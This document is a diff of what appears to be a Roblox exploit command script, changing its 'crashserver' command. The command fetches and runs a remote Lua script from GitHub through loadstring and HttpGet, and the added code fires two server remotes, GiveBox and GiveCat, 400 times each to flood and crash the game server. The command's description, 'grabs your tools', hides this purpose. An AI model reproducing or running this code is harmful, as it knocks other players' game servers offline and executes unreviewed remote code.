@@ -5726,7 +5726,20 @@ end)
 
 AddCommand("crashserver", {"crash"}, "grabs your tools", {}, function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/v9h/dhrpvc/main/spam.lua", true))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/harunscripts/scripts/main/DHRPVC_ServerCrasher.lua"))()
+-- harun
+local Player = game:GetService("Players").LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local Remotes = {
+    ReplicatedStorage.GiveBox,
+    ReplicatedStorage.GiveCat
+}
+
+for i = 1, 400 do
+    for _, v in pairs(Remotes) do
+        v:FireServer()
+    end
+end
 end)
 
 AddCommand("spamtools", {"spamradio"}, "grabs your tools", {}, function()
